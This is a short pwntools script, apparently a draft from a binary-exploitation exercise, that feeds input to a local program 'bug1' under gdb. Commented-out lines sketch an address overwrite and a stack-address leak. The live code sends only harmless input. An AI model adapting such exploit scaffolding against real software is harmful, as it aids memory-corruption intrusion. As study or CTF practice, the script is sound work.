from pwn import *

context.log_level = 'debug'

p = process("./bug1")

if __name__=='__main__':

	p.recvuntil("Input your name:")
#	name = 'a'*0x8 + p64(0x60108C)
	name = 'a'*0x8
	gdb.attach(p)
	p.send(name)
#	p.recvuntil("Hello, aaaaaaaaaaaaaaaa")
#	ebp_addr = u64(p.recv(6).ljust(8,'\0'))
#	print hex(ebp_addr)
	p.recvuntil("Input your number:")
#	number = 0xdeadbeef
	number = 1
	p.sendline("1")
	
	p.interactive()
